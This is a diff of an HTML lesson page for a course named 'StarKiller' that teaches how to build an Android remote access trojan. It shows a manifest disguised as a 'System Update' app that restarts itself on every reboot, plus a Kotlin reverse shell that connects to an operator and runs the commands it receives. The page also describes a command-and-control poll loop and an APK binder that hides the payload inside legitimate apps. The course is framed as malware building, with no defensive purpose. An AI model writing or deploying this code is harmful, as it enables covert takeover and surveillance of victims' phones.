@@ -6,143 +6,164 @@
 <title>StarKiller — Course 04 — 22DIV LABS</title>
 <meta name="author" content="George Wu">
 <style>
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-:root {
-  --bg: #0c0c0c; --bg2: #111; --bg4: #0a0a0a;
-  --cyan: #00e5ff; --cyan2: #00b8cc; --cyan3: #007799;
-  --amber: #ffb000; --red: #ff4444; --green: #00ff41; --green3: #009922;
-  --dim: #555; --muted: #888; --text: #ccc; --bright: #eee;
-  --mono: "Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --bg:#0c0c0c;--bg2:#111;--bg4:#0a0a0a;
+  --cyan:#00e5ff;--cyan2:#00b8cc;--cyan3:#007799;
+  --dim:#555;--muted:#888;--text:#ccc;--bright:#eee;
+  --mono:"Cascadia Code","Consolas","Source Code Pro","Courier New",monospace;
 }
-html { scroll-behavior: smooth; }
-body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; min-height: 100vh; }
-body::after { content:""; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,229,255,0.006) 3px,rgba(0,229,255,0.006) 4px); pointer-events:none; z-index:999; }
-nav { position:sticky; top:0; background:rgba(12,12,12,0.95); backdrop-filter:blur(8px); border-bottom:1px solid #1a1a1a; z-index:100; padding:0.6rem 0; }
-nav .inner { max-width:1200px; margin:0 auto; padding:0 1.5rem; display:flex; gap:1.5rem; align-items:center; }
-nav a { color:var(--cyan2); text-decoration:none; font-size:0.8rem; opacity:0.8; transition:opacity 0.2s; }
-nav a:hover { opacity:1; }
-nav a.brand { color:var(--bright); font-weight:bold; opacity:1; }
-.layout { display:grid; grid-template-columns:220px 1fr; max-width:1200px; margin:0 auto; padding:2rem 1.5rem; gap:2rem; }
-@media(max-width:768px) { .layout { grid-template-columns:1fr; } .sidebar { display:none; } }
-.sidebar { position:sticky; top:80px; height:fit-content; }
-.sidebar h3 { font-size:0.7rem; letter-spacing:0.1em; color:var(--dim); margin-bottom:1rem; }
-.lesson-nav-item { display:block; padding:0.5rem 0.8rem; font-size:0.75rem; color:var(--muted); border-left:2px solid #222; cursor:pointer; transition:all 0.2s; margin-bottom:0.2rem; }
-.lesson-nav-item.active { color:var(--cyan); border-left-color:var(--cyan3); }
-.lesson-nav-item.done { color:var(--cyan2); border-left-color:var(--cyan3); opacity:0.6; }
-.lesson-nav-item.done::after { content:" ✓"; }
-.prog-bar { height:4px; background:#1a1a1a; margin:1.5rem 0 0.4rem; }
-.prog-fill { height:100%; background:var(--cyan3); transition:width 0.4s; }
-.prog-label { font-size:0.65rem; color:var(--dim); }
-.course-tag { font-size:0.65rem; letter-spacing:0.12em; color:var(--cyan2); margin-bottom:0.4rem; }
-.course-header { margin-bottom:2rem; border-bottom:1px solid #1a1a1a; padding-bottom:1.5rem; }
-.course-header h1 { font-size:1.2rem; color:var(--bright); }
-.course-header p { font-size:0.8rem; color:var(--muted); margin-top:0.4rem; }
-.lesson { display:none; } .lesson.active { display:block; }
-.lesson-num { font-size:0.65rem; letter-spacing:0.12em; color:var(--cyan2); }
-.lesson-header h2 { font-size:1rem; color:var(--cyan); margin:0.3rem 0 0.5rem; }
-.lesson-header .desc { font-size:0.82rem; color:var(--text); max-width:680px; }
-.concept-box { background:var(--bg2); border:1px solid #1e1e1e; border-left:3px solid var(--cyan3); padding:1.2rem; margin:1.5rem 0; }
-.concept-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--cyan2); margin-bottom:0.8rem; }
-.concept-box p { font-size:0.82rem; color:var(--text); margin-bottom:0.6rem; }
-.concept-box p:last-child { margin-bottom:0; }
-.concept-box code { color:var(--cyan); background:#001a1a; padding:0.1rem 0.3rem; }
-.mission-box h3 { font-size:0.75rem; letter-spacing:0.1em; color:var(--cyan2); margin-bottom:0.8rem; border-left:3px solid var(--cyan3); padding-left:0.8rem; }
-.task-desc { font-size:0.82rem; color:var(--text); margin-bottom:1rem; }
-.code-ref { background:var(--bg4); border:1px solid #1a1a1a; padding:1rem; margin-bottom:1rem; overflow-x:auto; }
-.code-ref-label { font-size:0.65rem; color:var(--dim); margin-bottom:0.5rem; }
-.code-ref pre { font-size:0.8rem; color:#66ddff; line-height:1.6; white-space:pre; }
-.editor-label { font-size:0.7rem; color:var(--muted); margin-bottom:0.4rem; }
-textarea.code-editor { width:100%; min-height:160px; background:var(--bg4); color:#66ddff; font-family:var(--mono); font-size:0.82rem; border:1px solid #333; padding:1rem; resize:vertical; tab-size:4; outline:none; line-height:1.6; display:block; transition:border-color 0.2s; }
-textarea.code-editor:focus { border-color:var(--cyan3); }
-textarea.code-editor.pass { border-color:var(--green3); }
-textarea.code-editor.fail { border-color:var(--red); }
-.editor-controls { display:flex; gap:0.8rem; margin-top:0.6rem; }
-button { font-family:var(--mono); cursor:pointer; font-size:0.75rem; padding:0.5rem 1.2rem; border:none; transition:background 0.15s; }
-.btn-check { background:var(--cyan3); color:var(--bright); }
-.btn-check:hover { background:var(--cyan2); color:#000; }
-.btn-skip { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
-.btn-next { background:var(--cyan3); color:var(--bright); display:none; margin-top:1rem; }
-.btn-next.show { display:inline-block; }
-.btn-prev { background:#1a1a1a; color:var(--muted); border:1px solid #333; }
-.result-panel { margin-top:1rem; font-size:0.78rem; }
-.result-pass { color:var(--green); padding:0.8rem; background:#001a00; border:1px solid var(--green3); margin-bottom:0.5rem; }
-.result-fail { color:var(--red); padding:0.8rem; background:#1a0000; border:1px solid #550000; margin-bottom:0.5rem; }
-.line-ok { color:var(--green3); padding:0.15rem 0.5rem; }
-.line-err { color:var(--red); padding:0.15rem 0.5rem; background:#0d0000; margin:0.1rem 0; }
-.explain-box { background:#00080d; border:1px solid var(--cyan3); padding:1rem; margin-top:1rem; display:none; }
-.explain-box.show { display:block; }
-.explain-box h3 { font-size:0.75rem; color:var(--cyan2); margin-bottom:0.6rem; }
-.explain-box p { font-size:0.8rem; color:var(--text); margin-bottom:0.5rem; }
-.explain-box code { color:var(--cyan); background:#001a1a; padding:0.1rem 0.3rem; }
-.lesson-nav-bar { display:flex; gap:1rem; margin-top:2rem; padding-top:1.5rem; border-top:1px solid #1a1a1a; }
-.complete-screen { display:none; text-align:center; padding:3rem 1rem; }
-.complete-screen.show { display:block; }
-.complete-screen h2 { font-size:1.3rem; color:var(--cyan); margin-bottom:1rem; }
-.complete-screen p { font-size:0.85rem; color:var(--muted); margin-bottom:1.5rem; }
-.complete-screen a { color:var(--cyan2); text-decoration:none; }
+html{scroll-behavior:smooth;}
+body{font-family:var(--mono);background:var(--bg);color:var(--text);line-height:1.7;min-height:100vh;display:flex;flex-direction:column;}
+body::after{content:"";position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,229,255,0.006) 3px,rgba(0,229,255,0.006) 4px);pointer-events:none;z-index:999;}
+nav{position:sticky;top:0;background:rgba(12,12,12,0.95);backdrop-filter:blur(8px);border-bottom:1px solid #1a1a1a;z-index:100;padding:0.6rem 0;}
+nav .inner{max-width:1200px;margin:0 auto;padding:0 1.5rem;display:flex;gap:1.5rem;align-items:center;flex-wrap:wrap;}
+nav a{color:var(--cyan2);text-decoration:none;font-size:0.8rem;letter-spacing:0.05em;opacity:.8;transition:opacity .2s;}
+nav a:hover{opacity:1;}
+nav a.brand{color:var(--bright);font-weight:bold;font-size:0.9rem;opacity:1;margin-right:auto;}
+.layout{display:flex;flex:1;max-width:1200px;margin:0 auto;width:100%;padding:1.5rem;gap:1.5rem;}
+.sidebar{width:220px;flex-shrink:0;}
+.sidebar-sticky{position:sticky;top:4rem;}
+.sidebar h3{font-size:0.7rem;letter-spacing:0.12em;color:var(--dim);margin-bottom:1rem;padding-bottom:0.4rem;border-bottom:1px solid #1a1a1a;}
+.nav-item{display:flex;align-items:center;gap:0.6rem;padding:0.4rem 0.6rem;margin-bottom:0.2rem;font-size:0.72rem;color:var(--muted);cursor:pointer;border:1px solid transparent;transition:all .15s;user-select:none;}
+.nav-item:hover{color:var(--cyan2);border-color:#222;}
+.nav-item.active{color:var(--cyan2);border-color:var(--cyan3);background:rgba(0,119,153,0.05);}
+.nav-item.done{color:var(--cyan3);}
+.nav-item.done .nav-num{background:var(--cyan3);color:#000;border-color:var(--cyan3);}
+.nav-num{width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:0.6rem;border:1px solid #333;flex-shrink:0;}
+.nav-item.active .nav-num{border-color:var(--cyan3);background:var(--cyan3);color:#000;}
+.prog-wrap{margin-top:1.5rem;}
+.prog-label{font-size:0.65rem;color:var(--dim);margin-bottom:.4rem;}
+.prog-bar{height:3px;background:#1a1a1a;}
+.prog-fill{height:100%;background:var(--cyan3);transition:width .3s;}
+.main{flex:1;min-width:0;}
+.lesson{display:none;}.lesson.active{display:block;}
+.lang-badge{display:inline-block;padding:0.2rem 0.7rem;font-size:0.62rem;letter-spacing:0.12em;border:1px solid;margin-bottom:0.8rem;font-weight:bold;}
+.lang-xml{border-color:#b5823d;color:#d5a25b;background:rgba(181,130,61,0.05);}
+.lang-kotlin{border-color:#7c52b5;color:#9c72d5;background:rgba(124,82,181,0.05);}
+.lang-python{border-color:#3d7ab5;color:#5b9bd5;background:rgba(59,122,181,0.05);}
+.lesson-header{margin-bottom:1.2rem;border-bottom:1px solid #1a1a1a;padding-bottom:1rem;}
+.lesson-tag{font-size:0.65rem;letter-spacing:0.12em;color:var(--dim);margin-bottom:.4rem;}
+.lesson-header h2{font-size:1.15rem;color:var(--bright);letter-spacing:0.04em;margin-bottom:.4rem;}
+.lesson-header p{font-size:0.82rem;color:var(--muted);}
+.metaphor{background:#030d0f;border-left:3px solid var(--cyan3);padding:1rem 1.2rem;margin-bottom:1.2rem;font-size:0.82rem;color:var(--muted);}
+.metaphor .meta-label{font-size:0.65rem;letter-spacing:0.12em;color:var(--cyan2);margin-bottom:0.5rem;}
+.metaphor strong{color:var(--bright);}
+.nomenclature{margin-bottom:1.2rem;border:1px solid #0a2030;}
+.nomenclature h4{font-size:0.65rem;letter-spacing:0.12em;color:var(--cyan2);padding:0.6rem 1rem;border-bottom:1px solid #0a2030;background:#030d0f;}
+.nomenclature table{width:100%;border-collapse:collapse;font-size:0.77rem;}
+.nomenclature td{padding:0.45rem 1rem;border-bottom:1px solid #111;vertical-align:top;}
+.nomenclature td:first-child{color:#55ccdd;width:210px;white-space:nowrap;font-weight:bold;}
+.nomenclature td:last-child{color:var(--muted);}
+.nomenclature tr:last-child td{border-bottom:none;}
+.code-ref{background:var(--bg4);border:1px solid #0a2030;padding:1rem;margin-bottom:1.2rem;overflow-x:auto;}
+.code-ref-label{font-size:0.65rem;letter-spacing:0.1em;color:var(--dim);margin-bottom:.6rem;}
+.code-ref pre{font-size:0.76rem;color:#66ddff;line-height:1.65;white-space:pre;}
+.code-ref pre .cm{color:var(--dim);}
+.task-label{font-size:0.7rem;letter-spacing:0.1em;color:var(--cyan2);margin-bottom:.5rem;margin-top:0.5rem;}
+.task-desc{font-size:0.8rem;color:var(--muted);margin-bottom:0.8rem;}
+textarea.code-editor{width:100%;min-height:160px;background:var(--bg4);color:#66ddff;font-family:var(--mono);font-size:0.82rem;border:1px solid #333;padding:1rem;resize:vertical;tab-size:4;outline:none;line-height:1.6;display:block;transition:border-color .2s;}
+textarea.code-editor:focus{border-color:var(--cyan3);}
+textarea.code-editor.pass{border-color:var(--cyan3);}
+textarea.code-editor.fail{border-color:#882222;}
+.btn-row{display:flex;gap:.8rem;margin:.6rem 0;flex-wrap:wrap;}
+.btn{font-family:var(--mono);cursor:pointer;font-size:0.75rem;padding:.45rem 1.2rem;border:1px solid;background:transparent;letter-spacing:.06em;transition:all .15s;}
+.btn-check{border-color:var(--cyan3);color:var(--cyan2);}
+.btn-check:hover{background:var(--cyan3);color:#000;}
+.btn-skip{border-color:#333;color:var(--dim);}
+.btn-skip:hover{border-color:#555;color:var(--muted);}
+.result-panel{margin-top:.8rem;font-size:0.78rem;}
+.result-pass{color:var(--cyan2);padding:.6rem;background:#001a1a;border:1px solid var(--cyan3);margin-bottom:.4rem;}
+.result-fail{color:#ff6666;padding:.6rem;background:#1a0000;border:1px solid #550000;margin-bottom:.4rem;}
+.line-ok{color:var(--dim);padding:.1rem .4rem;}
+.line-err{color:#ff6666;padding:.15rem .4rem;background:#0d0000;margin:.1rem 0;}
+.explain-box{background:#00080d;border:1px solid var(--cyan3);padding:1rem 1.2rem;margin-top:.8rem;display:none;}
+.explain-box.show{display:block;}
+.explain-box h4{font-size:0.65rem;color:var(--cyan2);margin-bottom:.5rem;letter-spacing:.1em;}
+.explain-box p{font-size:.8rem;color:var(--text);margin-bottom:.5rem;}
+.explain-box code{color:var(--cyan);background:#001a1a;padding:.1em .3em;}
+.next-wrap{display:none;margin-top:1rem;padding-top:1rem;border-top:1px solid #1a1a1a;}
+.next-wrap.show{display:flex;gap:1rem;}
+.btn-next{border-color:var(--cyan3);color:var(--cyan2);}
+.btn-next:hover{background:var(--cyan3);color:#000;}
+.btn-prev{border-color:#222;color:var(--dim);}
+.btn-prev:hover{border-color:#444;color:var(--muted);}
+.complete-screen{display:none;text-align:center;padding:3rem 2rem;}
+.complete-screen.show{display:block;}
+.complete-screen h2{font-size:1.2rem;color:var(--cyan2);letter-spacing:.1em;margin-bottom:1rem;}
+.complete-screen p{font-size:.82rem;color:var(--muted);margin-bottom:.6rem;}
+.complete-screen a{color:var(--cyan2);text-decoration:none;}
+code{background:#1a1a1a;padding:.1em .3em;color:#66ddff;font-size:.88em;}
 </style>
 </head>
 <body>
 <nav>
   <div class="inner">
     <a href="../index.html" class="brand">VADER // 22DIV</a>
-    <a href="index.html">← LABS</a>
-    <a href="#">STARKILLER</a>
+    <a href="index.html" style="color:var(--cyan2)">← LABS</a>
+    <span style="color:var(--dim);font-size:.75rem">// COURSE 04 — STARKILLER</span>
   </div>
 </nav>
 <div class="layout">
-  <aside class="sidebar">
+<aside class="sidebar">
+  <div class="sidebar-sticky">
     <h3>// LESSONS</h3>
-    <div class="lesson-nav-item active" onclick="goLesson(1)" id="nav-1">01. ANDROID MANIFEST</div>
-    <div class="lesson-nav-item" onclick="goLesson(2)" id="nav-2">02. KOTLIN TCP SOCKET</div>
-    <div class="lesson-nav-item" onclick="goLesson(3)" id="nav-3">03. HTTP C2 POLL LOOP</div>
-    <div class="lesson-nav-item" onclick="goLesson(4)" id="nav-4">04. APK BINDER LOGIC</div>
-    <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
-    <div class="prog-label" id="overall-label">0 / 4 complete</div>
-  </aside>
-  <main>
-    <div class="course-header">
-      <div class="course-tag">// COURSE 04 — ANDROID RAT</div>
-      <h1>STARKILLER</h1>
-      <p>Android remote access tool. Kotlin client. TCP reverse shell. HTTP C2 poll loop. APK binder to wrap payload inside legitimate apps. Phase 1 complete — commit 67aa4fd.</p>
+    <div class="nav-item active" id="nav-1" onclick="goLesson(1)"><span class="nav-num">1</span>Android Manifest</div>
+    <div class="nav-item" id="nav-2" onclick="goLesson(2)"><span class="nav-num">2</span>Kotlin TCP Shell</div>
+    <div class="nav-item" id="nav-3" onclick="goLesson(3)"><span class="nav-num">3</span>HTTP C2 Poll</div>
+    <div class="nav-item" id="nav-4" onclick="goLesson(4)"><span class="nav-num">4</span>APK Binder</div>
+    <div class="prog-wrap">
+      <div class="prog-label" id="overall-label">0 / 4 complete</div>
+      <div class="prog-bar"><div class="prog-fill" id="overall-prog" style="width:0%"></div></div>
     </div>
+  </div>
+</aside>
+<main class="main">
 
-    <div class="lesson active" id="lesson-1">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 01 / 04</div>
-        <h2>ANDROID MANIFEST — PERMISSIONS</h2>
-        <div class="desc">The AndroidManifest.xml declares everything: permissions, services, broadcast receivers. The RAT needs INTERNET for C2, FOREGROUND_SERVICE to keep running, and optionally READ_CONTACTS/CAMERA for exfil.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// WHY PERMISSIONS MATTER</h3>
-        <p>Android's permission system is the primary gate. Without declaring a permission in the manifest, the app can't use it — even with root. You declare first, Android grants (or prompts the user) at install/runtime.</p>
-        <p><code>INTERNET</code> — no user prompt, granted automatically. Required for any network call. This is what connects to your C2.</p>
-        <p><code>FOREGROUND_SERVICE</code> — run a persistent service that survives the app being backgrounded. Without this, Android kills the process after a few minutes.</p>
-        <p>The service declaration ties everything together: the RAT's C2 connection runs inside a Service component so it persists. The <code>android:exported="false"</code> prevents other apps from starting it — only your app can.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the RAT's AndroidManifest.xml skeleton</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.system.update"&gt;
+<!-- LESSON 1 -->
+<div class="lesson active" id="lesson-1">
+  <div class="lesson-header">
+    <span class="lang-badge lang-xml">XML — ANDROID MANIFEST</span>
+    <div class="lesson-tag">// LESSON 01 / 04 — ANDROID MANIFEST</div>
+    <h2>Declaring Your Presence — The Permission Gate</h2>
+    <p>The AndroidManifest.xml is the app's declaration of intent. Every capability the app uses must be listed here or Android denies it at runtime. Get the permissions wrong and the RAT either crashes on first connection or dies when the screen locks.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    Before deploying an asset into a country, you file the cover story with the agency — passport, occupation, declared capabilities. The host nation (Android OS) checks the manifest at install time. <strong>INTERNET = declared cover. FOREGROUND_SERVICE = permission to operate after dark. RECEIVE_BOOT_COMPLETED = permission to activate on base re-open. The service element is the asset. BootReceiver is the activation signal.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — ANDROID MANIFEST + XML</h4>
+    <table>
+      <tr><td><code>xmlns:android</code></td><td>XML namespace declaration. Required on the root element. Binds the <code>android:</code> prefix to the Android namespace URI. Without it, all <code>android:name</code> etc. attributes are unresolved.</td></tr>
+      <tr><td><code>package</code></td><td>The application's unique identifier on the device. Reverse-domain format by convention. <code>com.system.update</code> disguises as a system process — identical naming to a real OEM update agent.</td></tr>
+      <tr><td><code>uses-permission</code></td><td>Declares a required Android permission. INTERNET is "normal" — granted automatically at install, no user prompt. FOREGROUND_SERVICE is "normal" since Android 9. RECEIVE_BOOT_COMPLETED allows registering for the boot broadcast.</td></tr>
+      <tr><td><code>&lt;service&gt;</code></td><td>Declares a background Service component. <code>android:exported="false"</code> prevents other apps from binding to it. <code>foregroundServiceType="dataSync"</code> required on Android 14+ — declares what the service does.</td></tr>
+      <tr><td><code>&lt;receiver&gt;</code></td><td>Declares a BroadcastReceiver. <code>android:exported="true"</code> required for receivers that listen to system broadcasts. The intent-filter tells Android which broadcasts to deliver to this receiver.</td></tr>
+      <tr><td><code>BOOT_COMPLETED</code></td><td>System broadcast fired after Android finishes booting. BootReceiver catches it and starts C2Service. Persistence mechanism: RAT auto-activates on every reboot without any user interaction.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.system.update"&gt;  <span class="cm">&lt;!-- disguise as OEM update process --&gt;</span>
 
-    &lt;uses-permission android:name="android.permission.INTERNET"/&gt;
-    &lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt;
-    &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;
+    &lt;uses-permission android:name="android.permission.INTERNET"/&gt;  <span class="cm">&lt;!-- auto-granted: C2 comms --&gt;</span>
+    &lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt;  <span class="cm">&lt;!-- survive backgrounding --&gt;</span>
+    &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;  <span class="cm">&lt;!-- reboot persistence --&gt;</span>
 
     &lt;application
-        android:label="System Update"
+        android:label="System Update"  <span class="cm">&lt;!-- visible name in app list --&gt;</span>
         android:icon="@mipmap/ic_launcher"&gt;
 
         &lt;service
             android:name=".C2Service"
-            android:exported="false"
-            android:foregroundServiceType="dataSync"/&gt;
+            android:exported="false"  <span class="cm">&lt;!-- private: only this app can start it --&gt;</span>
+            android:foregroundServiceType="dataSync"/&gt;  <span class="cm">&lt;!-- Android 14+ required type --&gt;</span>
 
         &lt;receiver
             android:name=".BootReceiver"
-            android:exported="true"&gt;
+            android:exported="true"&gt;  <span class="cm">&lt;!-- must be true to receive system broadcasts --&gt;</span>
             &lt;intent-filter&gt;
                 &lt;action android:name="android.intent.action.BOOT_COMPLETED"/&gt;
             &lt;/intent-filter&gt;
@@ -150,214 +171,207 @@ button { font-family:var(--mono); cursor:pointer; font-size:0.75rem; padding:0.5
 
     &lt;/application&gt;
 &lt;/manifest&gt;</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-1" placeholder="&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
-    package=&quot;com.system.update&quot;&gt;
-    &lt;!-- permissions here --&gt;
-    &lt;!-- application + service + receiver here --&gt;
-&lt;/manifest&gt;"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(1)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-1"></div>
-        <div class="explain-box" id="explain-1">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>com.system.update</code> — the package name. Choosing a name that looks like a legitimate system package helps social engineering. "System Update" as the label means the icon is indistinguishable from real system apps.</p>
-          <p><code>RECEIVE_BOOT_COMPLETED</code> + the BootReceiver — persistence. When the phone reboots, Android fires the BOOT_COMPLETED broadcast. BootReceiver catches it, starts C2Service. The RAT re-establishes without any user interaction.</p>
-          <p><code>foregroundServiceType="dataSync"</code> — Android 14+ requires services to declare their type. <code>dataSync</code> is the most permissive non-dangerous category — it covers network operations.</p>
-        </div>
-        <button class="btn-next" id="next-1" onclick="goLesson(2)">NEXT: KOTLIN TCP SOCKET →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" disabled>← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(1)">SKIP →</button>
-      </div>
-    </div>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write the full AndroidManifest.xml. package="com.system.update", three permissions (INTERNET, FOREGROUND_SERVICE, RECEIVE_BOOT_COMPLETED), application with C2Service (exported=false, foregroundServiceType=dataSync) and BootReceiver with BOOT_COMPLETED intent filter.</p>
+  <textarea class="code-editor" id="editor-1" spellcheck="false" placeholder='&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"&#10;    package="com.system.update"&gt;&#10;    &lt;!-- permissions --&gt;&#10;    &lt;application&gt;&#10;        &lt;!-- service + receiver --&gt;&#10;    &lt;/application&gt;&#10;&lt;/manifest&gt;'></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(1)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(1)">→ SKIP</button>
+  </div>
+  <div class="result-panel" id="result-1"></div>
+  <div class="explain-box" id="explain-1">
+    <h4>// WHY THIS WORKS</h4>
+    <p><code>com.system.update</code> as the package name is a social engineering choice — it matches the naming convention of OEM system update agents, making it invisible to a non-technical user scanning their app list. Combined with "System Update" as the label and the generic ic_launcher icon, it's visually indistinguishable from a real system package.</p>
+  </div>
+  <div class="next-wrap" id="next-1">
+    <button class="btn btn-prev" disabled>← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(2)">NEXT LESSON →</button>
+  </div>
+</div>
 
-    <div class="lesson" id="lesson-2">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 02 / 04</div>
-        <h2>KOTLIN TCP REVERSE SHELL</h2>
-        <div class="desc">Same principle as the PS1 shell — connect out to the operator, execute commands from the stream, send back output. Kotlin's Socket class makes it clean.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// KOTLIN vs PS1 SHELL</h3>
-        <p>The logic is identical: open socket, read command from stream, run it, write output back. The difference is the execution environment — on Android you run shell commands via <code>Runtime.getRuntime().exec()</code>.</p>
-        <p>Android's shell is a stripped-down Busybox/Toybox. Not all standard Unix commands exist. But <code>id</code>, <code>ls</code>, <code>cat</code>, <code>pm list packages</code>, <code>dumpsys</code>, <code>am start</code> all work.</p>
-        <p>Run the socket work in a background thread — Android kills apps that block the main thread for more than 5 seconds (ANR). Coroutines or a plain Thread both work.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the Kotlin TCP reverse shell in C2Service</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>fun connectShell(ip: String, port: Int) {
-    Thread {
+<!-- LESSON 2 -->
+<div class="lesson" id="lesson-2">
+  <div class="lesson-header">
+    <span class="lang-badge lang-kotlin">KOTLIN — ANDROID JVM</span>
+    <div class="lesson-tag">// LESSON 02 / 04 — KOTLIN TCP REVERSE SHELL</div>
+    <h2>Same Radio Net, Different Radio — TCP Shell on Android</h2>
+    <p>The same principle as the PowerShell TCP shell: connect out, read commands from the stream, execute them, write output back. Kotlin's Socket is a wrapper around the same BSD socket API. The execution environment changes — Android runs shell commands via <code>Runtime.getRuntime().exec()</code>.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    You've been inserted into a forward operating base and you have a radio. You call back to command, report your status, then sit on the net waiting for instructions. Each instruction comes in, you execute it, you report the result. <strong>The socket IS the radio net. Runtime.exec is issuing the order to your ground team. Reader/writer are the transmit and receive channels. The while(true) loop is you staying on net until command says disconnect.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — KOTLIN SOCKETS + THREADING</h4>
+    <table>
+      <tr><td><code>Thread { }.start()</code></td><td>Creates and immediately starts a background OS thread. The lambda inside is the thread body. All network I/O must run off the main thread — Android kills apps that block the UI thread for 5+ seconds (ANR: Application Not Responding).</td></tr>
+      <tr><td><code>java.net.Socket(ip, port)</code></td><td>Connects to a remote TCP server. On Android you use the full java.net package — Kotlin doesn't have its own socket library. This is the client side: it initiates the outbound connection to your listener.</td></tr>
+      <tr><td><code>bufferedReader()</code></td><td>Wraps an InputStream in a BufferedReader for line-by-line reading. <code>readLine()</code> blocks until a complete line arrives or the stream closes. The <code>?: break</code> handles the null-on-close case.</td></tr>
+      <tr><td><code>Runtime.getRuntime().exec()</code></td><td>Forks a child process. <code>arrayOf("sh", "-c", cmd)</code> passes the command to the shell interpreter, enabling pipes, redirects, and shell builtins. Without <code>sh -c</code>, you'd need to split the command manually.</td></tr>
+      <tr><td><code>proc.inputStream</code></td><td>The child process's stdout. Similarly <code>errorStream</code> is its stderr. Android commands often write to stderr — you need both to get complete output, equivalent to <code>2>&amp;1</code> in shell.</td></tr>
+      <tr><td><code>.ifEmpty { "(no output)\n" }</code></td><td>Returns the fallback string if the receiver is empty. Prevents sending an empty packet back to the operator when a command produces no output — maintains the framing protocol.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>fun connectShell(ip: String, port: Int) {
+    Thread {                                           <span class="cm">// background thread — must not block main</span>
         try {
-            val socket = java.net.Socket(ip, port)
-            val reader = socket.getInputStream().bufferedReader()
-            val writer = socket.getOutputStream().bufferedWriter()
-            writer.write("OK\n")
-            writer.flush()
+            val socket = java.net.Socket(ip, port)    <span class="cm">// outbound TCP connect to C2 listener</span>
+            val reader = socket.getInputStream().bufferedReader()   <span class="cm">// read commands line by line</span>
+            val writer = socket.getOutputStream().bufferedWriter()  <span class="cm">// write output back</span>
+            writer.write("OK\n"); writer.flush()      <span class="cm">// beacon: "I'm here, ready"</span>
             while (true) {
-                val cmd = reader.readLine() ?: break
-                val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
-                val output = proc.inputStream.bufferedReader().readText()
-                val err = proc.errorStream.bufferedReader().readText()
-                writer.write((output + err).ifEmpty { "(no output)\n" })
-                writer.write("\n")
-                writer.flush()
+                val cmd = reader.readLine() ?: break  <span class="cm">// null = stream closed, exit loop</span>
+                val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))  <span class="cm">// sh -c: full shell</span>
+                val output = proc.inputStream.bufferedReader().readText()       <span class="cm">// stdout</span>
+                val err = proc.errorStream.bufferedReader().readText()          <span class="cm">// stderr (many cmds use it)</span>
+                writer.write((output + err).ifEmpty { "(no output)\n" })        <span class="cm">// merge, send</span>
+                writer.write("\n"); writer.flush()    <span class="cm">// frame delimiter</span>
             }
             socket.close()
         } catch (e: Exception) {
-            android.util.Log.e("C2", e.message ?: "error")
+            android.util.Log.e("C2", e.message ?: "error")  <span class="cm">// silent crash log only</span>
         }
     }.start()
 }</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-2" placeholder="fun connectShell(ip: String, port: Int) {
-    Thread {
-        // Socket connect, read commands, exec via sh -c, write output back
-    }.start()
-}"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(2)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-2"></div>
-        <div class="explain-box" id="explain-2">
-          <h3>// WHAT JUST HAPPENED</h3>
